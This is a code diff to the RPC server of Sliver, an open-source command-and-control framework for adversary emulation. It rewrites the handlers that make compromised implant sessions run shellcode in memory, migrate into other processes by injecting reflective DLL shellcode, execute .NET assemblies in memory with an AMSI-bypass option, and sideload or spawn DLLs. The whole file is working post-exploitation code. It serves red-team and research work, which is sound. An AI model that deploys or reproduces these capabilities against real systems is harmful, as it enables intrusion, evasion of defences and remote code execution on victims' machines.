@@ -18,155 +18,165 @@ package rpc
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-// import (
-// 	"fmt"
-// 	"io/ioutil"
-// 	"time"
+import (
+	"context"
+	"fmt"
+	"io/ioutil"
+	"path"
+	"time"
 
-// 	clientpb "github.com/bishopfox/sliver/protobuf/clientpb"
-// 	sliverpb "github.com/bishopfox/sliver/protobuf/sliverpb"
-// 	"github.com/bishopfox/sliver/server/assets"
-// 	"github.com/bishopfox/sliver/server/core"
-// 	"github.com/bishopfox/sliver/server/generate"
+	"github.com/bishopfox/sliver/protobuf/clientpb"
+	"github.com/bishopfox/sliver/protobuf/commonpb"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/server/assets"
+	"github.com/bishopfox/sliver/server/core"
+	"github.com/bishopfox/sliver/server/generate"
 
-// 	"github.com/golang/protobuf/proto"
-// )
+	"github.com/golang/protobuf/proto"
+)
 
-// func rpcTask(req []byte, timeout time.Duration, resp RPCResponse) {
-// 	taskReq := &clientpb.TaskReq{}
-// 	err := proto.Unmarshal(req, taskReq)
-// 	if err != nil {
-// 		resp([]byte{}, err)
-// 		return
-// 	}
-// 	sliver := core.Hive.Sliver(taskReq.SliverID)
-// 	data, _ := proto.Marshal(&sliverpb.Task{
-// 		Encoder:  "raw",
-// 		Data:     taskReq.Data,
-// 		RWXPages: taskReq.RwxPages,
-// 		Pid:      taskReq.Pid,
-// 	})
-// 	data, err = sliver.Request(sliverpb.MsgTask, timeout, data)
-// 	resp(data, err)
-// }
+// Task - Execute shellcode in-memory
+func (rpc *Server) Task(ctx context.Context, req *sliverpb.TaskReq) (*commonpb.Empty, error) {
+	resp := &commonpb.Empty{}
+	err := rpc.GenericHandler(req, resp)
+	if err != nil {
+		return nil, err
+	}
+	return resp, nil
+}
 
-// func rpcMigrate(req []byte, timeout time.Duration, resp RPCResponse) {
-// 	migrateReq := &clientpb.MigrateReq{}
-// 	err := proto.Unmarshal(req, migrateReq)
-// 	if err != nil {
-// 		resp([]byte{}, err)
-// 	}
-// 	sliver := core.Hive.Sliver(migrateReq.SliverID)
-// 	config := generate.SliverConfigFromProtobuf(migrateReq.Config)
-// 	config.Format = clientpb.SliverConfig_SHARED_LIB
-// 	config.ObfuscateSymbols = false
-// 	dllPath, err := generate.SliverSharedLibrary(config)
-// 	if err != nil {
-// 		resp([]byte{}, err)
-// 		return
-// 	}
-// 	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
-// 	if err != nil {
-// 		resp([]byte{}, err)
-// 		return
-// 	}
-// 	data, _ := proto.Marshal(&sliverpb.MigrateReq{
-// 		SliverID: migrateReq.SliverID,
-// 		Data:     shellcode,
-// 		Pid:      migrateReq.Pid,
-// 	})
-// 	data, err = sliver.Request(sliverpb.MsgMigrateReq, timeout, data)
-// 	resp(data, err)
-// }
+// Migrate - Migrate to a new process on the remote system (Windows only)
+func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliverpb.Migrate, error) {
+	session := core.Hive.Sliver(req.Request.SessionID)
+	if session == nil {
+		return nil, ErrInvalidSessionID
+	}
 
-// func rpcExecuteAssembly(req []byte, timeout time.Duration, resp RPCResponse) {
-// 	execReq := &sliverpb.ExecuteAssemblyReq{}
-// 	err := proto.Unmarshal(req, execReq)
-// 	if err != nil {
-// 		rpcLog.Warnf("Error unmarshaling ExecuteAssemblyReq: %v", err)
-// 		resp([]byte{}, err)
-// 		return
-// 	}
-// 	sliver := core.Hive.Sliver(execReq.SliverID)
-// 	if sliver == nil {
-// 		rpcLog.Warnf("Could not find Sliver with ID: %d", execReq.SliverID)
-// 		resp([]byte{}, err)
-// 		return
-// 	}
-// 	hostingDllPath := assets.GetDataDir() + "/HostingCLRx64.dll"
-// 	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
-// 	if err != nil {
-// 		rpcLog.Warnf("Could not find hosting dll in %s", assets.GetDataDir())
-// 		resp([]byte{}, err)
-// 		return
-// 	}
-// 	data, _ := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
-// 		Assembly:   execReq.Assembly,
-// 		HostingDll: hostingDllBytes,
-// 		Arguments:  execReq.Arguments,
-// 		Process:    execReq.Process,
-// 		AmsiBypass: execReq.AmsiBypass,
-// 		SliverID:   execReq.SliverID,
-// 	})
-// 	rpcLog.Infof("Sending execute assembly request to sliver %d\n", execReq.SliverID)
-// 	data, err = sliver.Request(sliverpb.MsgExecuteAssemblyReq, timeout, data)
-// 	resp(data, err)
+	config := generate.ImplantConfigFromProtobuf(req.Config)
+	config.Format = clientpb.ImplantConfig_SHARED_LIB
+	config.ObfuscateSymbols = false
+	dllPath, err := generate.SliverSharedLibrary(config)
+	if err != nil {
+		return nil, err
+	}
+	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
+	if err != nil {
+		return nil, err
+	}
+	reqData, err := proto.Marshal(&sliverpb.InvokeMigrateReq{
+		Request: req.Request,
+		Data:    shellcode,
+		Pid:     req.Pid,
+	})
+	if err != nil {
+		return nil, err
+	}
+	timeout := time.Duration(req.Request.Timeout)
+	respData, err := session.Request(sliverpb.MsgMigrateReq, timeout, reqData)
+	if err != nil {
+		return nil, err
+	}
+	resp := &sliverpb.Migrate{}
+	err = proto.Unmarshal(respData, resp)
+	if err != nil {
+		return nil, err
+	}
+	return resp, nil
+}
 
-// }
+// ExecuteAssembly - Execute a .NET assembly on the remote system in-memory (Windows only)
+func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAssemblyReq) (*sliverpb.ExecuteAssembly, error) {
+	session := core.Hive.Sliver(req.Request.SessionID)
+	if session == nil {
+		return nil, ErrInvalidSessionID
+	}
 
-// func rpcSideload(req []byte, timeout time.Duration, resp RPCResponse) {
-// 	var data []byte
-// 	sideloadReq := &clientpb.SideloadReq{}
-// 	err := proto.Unmarshal(req, sideloadReq)
-// 	if err != nil {
-// 		rpcLog.Warn("Error unmarshaling SideloadReq: %v", err)
-// 		resp([]byte{}, err)
-// 		return
-// 	}
-// 	sliver := core.Hive.Sliver(sideloadReq.SliverID)
-// 	if sliver == nil {
-// 		rpcLog.Warnf("Could not find Sliver with ID: %d", sideloadReq.SliverID)
-// 		resp([]byte{}, err)
-// 		return
-// 	}
-// 	switch sliver.ToProtobuf().GetOS() {
-// 	case "windows":
-// 		shellcode, err := generate.ShellcodeRDIFromBytes(sideloadReq.Data, sideloadReq.EntryPoint, sideloadReq.Args)
-// 		if err != nil {
-// 			resp([]byte{}, err)
-// 			return
-// 		}
-// 		data, _ = proto.Marshal(&sliverpb.SideloadReq{
-// 			SliverID: sideloadReq.SliverID,
-// 			Data:     shellcode,
-// 			ProcName: sideloadReq.ProcName,
-// 		})
-// 		data, err = sliver.Request(sliverpb.MsgSideloadReq, timeout, data)
-// 	case "darwin":
-// 		fallthrough
-// 	case "linux":
-// 		data, _ = proto.Marshal(&sliverpb.SideloadReq{
-// 			SliverID: sideloadReq.GetSliverID(),
-// 			Data:     sideloadReq.GetData(),
-// 			Args:     sideloadReq.GetArgs(),
-// 			ProcName: sideloadReq.GetProcName(),
-// 		})
-// 		data, err = sliver.Request(sliverpb.MsgSideloadReq, timeout, data)
-// 	default:
-// 		err = fmt.Errorf("%s does not support sideloading", sliver.ToProtobuf().GetOS())
-// 	}
-// 	resp(data, err)
+	// We have to add the hosting DLL to the request before forwarding it to the implant
+	hostingDllPath := path.Join(assets.GetDataDir(), "HostingCLRx64.dll")
+	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
+	if err != nil {
+		return nil, err
+	}
+	reqData, err := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
+		Request:    req.Request,
+		Assembly:   req.Assembly,
+		HostingDll: hostingDllBytes,
+		Arguments:  req.Arguments,
+		Process:    req.Process,
+		AmsiBypass: req.AmsiBypass,
+	})
+	if err != nil {
+		return nil, err
+	}
 
-// }
+	rpcLog.Infof("Sending execute assembly request to session %d\n", req.Request.SessionID)
+	timeout := time.Duration(req.Request.Timeout)
+	respData, err := session.Request(sliverpb.MsgExecuteAssemblyReq, timeout, reqData)
+	if err != nil {
+		return nil, err
+	}
+	resp := &sliverpb.ExecuteAssembly{}
+	err = proto.Unmarshal(respData, resp)
+	if err != nil {
+		return nil, err
+	}
+	return resp, nil
+}
 
-// func rpcSpawnDll(req []byte, timeout time.Duration, resp RPCResponse) {
-// 	spawnReq := &sliverpb.SpawnDllReq{}
-// 	err := proto.Unmarshal(req, spawnReq)
-// 	if err != nil {
-// 		resp([]byte{}, err)
-// 		return
-// 	}
-// 	sliver := core.Hive.Sliver(spawnReq.SliverID)
-// 	data, err := sliver.Request(sliverpb.MsgSpawnDllReq, timeout, req)
-// 	resp(data, err)
-// }
+// Sideload - Sideload a DLL on the remote system (Windows only)
+func (rpc *Server) Sideload(ctx context.Context, req *sliverpb.SideloadReq) (*sliverpb.Sideload, error) {
+	session := core.Hive.Sliver(req.Request.SessionID)
+	if session == nil {
+		return nil, ErrInvalidSessionID
+	}
+
+	var err error
+	var respData []byte
+	timeout := time.Duration(req.Request.Timeout)
+	switch session.ToProtobuf().GetOS() {
+	case "windows":
+		shellcode, err := generate.ShellcodeRDIFromBytes(req.Data, req.EntryPoint, req.Args)
+		if err != nil {
+			return nil, err
+		}
+		data, err := proto.Marshal(&sliverpb.SideloadReq{
+			Request:  req.Request,
+			Data:     shellcode,
+			ProcName: req.ProcName,
+		})
+		if err != nil {
+			return nil, err
+		}
+		respData, err = session.Request(sliverpb.MsgSideloadReq, timeout, data)
+	case "darwin":
+		fallthrough
+	case "linux":
+		reqData, err := proto.Marshal(req)
+		if err != nil {
+			return nil, err
+		}
+		respData, err = session.Request(sliverpb.MsgSideloadReq, timeout, reqData)
+	default:
+		err = fmt.Errorf("%s does not support sideloading", session.ToProtobuf().GetOS())
+	}
+	if err != nil {
+		return nil, err
+	}
+
+	resp := &sliverpb.Sideload{}
+	err = proto.Unmarshal(respData, resp)
+	if err != nil {
+		return nil, err
+	}
+	return resp, nil
+}
+
+// SpawnDll - Spawn a DLL on the remote system (Windows only)
+func (rpc *Server) SpawnDll(ctx context.Context, req *sliverpb.SpawnDllReq) (*sliverpb.SpawnDll, error) {
+	resp := &sliverpb.SpawnDll{}
+	err := rpc.GenericHandler(req, resp)
+	if err != nil {
+		return nil, err
+	}
+	return resp, nil
+}
